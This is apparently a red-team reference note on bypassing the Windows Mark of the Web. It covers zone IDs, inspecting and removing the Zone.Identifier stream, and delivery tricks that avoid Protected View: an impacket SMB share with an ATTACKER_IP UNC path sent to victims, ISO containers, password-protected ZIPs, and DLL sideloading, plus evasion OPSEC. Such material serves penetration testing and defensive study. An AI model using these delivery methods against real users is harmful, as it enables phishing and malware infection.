---
title: Mark of the Web (MotW)
draft: false
tags:
  - red-teaming
  - motw
  - windows
  - evasion
  - initial-access
---

The **Mark of the Web** (MoTW) is a Windows security mechanism that tracks the origin zone of downloaded files. When a file is downloaded through a browser, email client, or other internet-aware application, Windows attaches a hidden **Zone Identifier** stored as an NTFS Alternate Data Stream (ADS) named `Zone.Identifier`.

Office applications, Windows SmartScreen, and other security tools read this flag to decide how to treat the file: files from the Internet zone (ZoneId=3) open in **Protected View** in Office (macros disabled), trigger SmartScreen warnings on executables, and are subject to various other restrictions.

As an attacker, understanding MoTW is critical — a payload that works when run locally may fail silently when delivered via email due to Protected View blocking macro execution.

---
# Zone IDs

| ZoneId | Zone | Effect |
|--------|------|--------|
| 0 | Local Machine | Fully trusted, no restrictions |
| 1 | Local Intranet | Reduced restrictions |
| 2 | Trusted Sites | Reduced restrictions |
| 3 | Internet | Protected View in Office, SmartScreen warnings on EXEs |
| 4 | Restricted Sites | Maximum restrictions |

---
# Inspecting MoTW on a File

```powershell
# PowerShell — read the Zone.Identifier ADS
PS> Get-Content -Path .\document.docm -Stream Zone.Identifier

[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://example.com/
HostUrl=https://example.com/document.docm
```

```cmd
:: CMD — alternative using more
C:\> more < "document.docm:Zone.Identifier"

[ZoneTransfer]
ZoneId=3
```

```bash
# From Linux — check if an ADS-carrying file downloaded to a Windows share has the stream
# (Samba/NTFS may preserve ADS)
$ getfattr -n user.DOSATTRIB document.docm
```

To **remove** MoTW from a file (requires access to the file):
```powershell
# Unblock a single file (removes Zone.Identifier ADS)
PS> Unblock-File -Path .\document.docm

# Verify it's gone
PS> Get-Item .\document.docm -Stream * | Where-Object Stream -ne ':$DATA'
```

```cmd
:: Alternative via streams.exe (Sysinternals)
C:\> streams.exe -d document.docm
```

---
# Delivery Methods That Avoid MoTW

## 1. SMB Share Delivery
Files opened directly from a UNC path (`\\attacker\share\doc.docm`) do not receive ZoneId=3 — they're treated as Intranet (ZoneId=1) or Local zone. No Protected View, no SmartScreen.

```bash
# Host a Samba share on Kali
$ sudo impacket-smbserver share /path/to/files -smb2support

# Send the UNC path to the victim (e.g., via email body, Teams message)
\\ATTACKER_IP\share\document.docm
```

## 2. Container Files (ISO, VHD, IMG)

On older/unpatched Windows, files extracted from container formats like ISO, VHD, or IMG do not inherit MoTW from the container. The victim mounts the ISO (double-click), sees the contents in Explorer, and opens the file — no Protected View.

```bash
# Create an ISO containing the payload (Linux)
$ mkisofs -o payload.iso /path/to/payload_folder/

# Or use a tool like AnyBurn/ImgBurn on Windows
```

> [!Caution]
> Since **Windows 11 22H2 (KB5027231)** and Office updates in 2022–2023, Microsoft extended MoTW propagation to files inside ISO and ZIP containers. This bypass no longer works reliably on **fully patched systems**. Test against the specific target patch level.

## 3. Password-Protected ZIP

Password-protected ZIP archives cannot be inspected by Windows Defender or SmartScreen at download time. The ADS is applied to the ZIP itself, but when the user extracts the contents with the password, the extracted files may not inherit MoTW in some configurations.

This also bypasses email gateway scanning since AV cannot read the encrypted archive.

## 4. `.doc` (Word 97-2003 Format)

The legacy `.doc` format uses the older compound document format (OLE). Some email pipelines and older Office versions strip the ADS on save or do not propagate it correctly. Less reliable on modern systems, but worth testing.

## 5. DLL Sideloading via Signed Binaries in ZIP

Package a Microsoft-signed binary with a malicious DLL inside a ZIP archive. The signed binary has inherent trust and may not trigger SmartScreen. When extracted and run, the binary loads the malicious DLL via DLL search order hijacking — MoTW on the ZIP does not prevent the DLL load.

See [[Client Side Attacks with File Containers (DLLs)]] for full implementation.

---
# OPSEC

> [!Warning] OPSEC
> - Always test your delivery method against the **target's specific patch level**. MoTW bypass effectiveness varies heavily by Windows version and Office update.
> - SMB delivery requires the victim to be on the same network or VPN, or requires a publicly accessible SMB server (firewall permitting).
> - ISO delivery via email has become unreliable on patched Windows 11 systems — use ZIP+password or DLL sideloading as alternatives.
> - Even if MoTW is bypassed, **AMSI** and **EDR behavioral detection** are still active. MoTW bypass solves the "Protected View" problem but not AV detection of the payload itself — see [[AV Evasion]].

---
# Related Notes
- [[Client Side Attacks with File Containers (DLLs)]] — DLL sideloading via signed binaries in ZIP to bypass MoTW
- [[Phishing with Microsoft Office]] — VBA macro delivery; MoTW triggers Protected View blocking macros
- [[AV Evasion]] — evading detection once MoTW is bypassed
- [[Pretexting]] — social engineering to convince the victim to unblock files manually
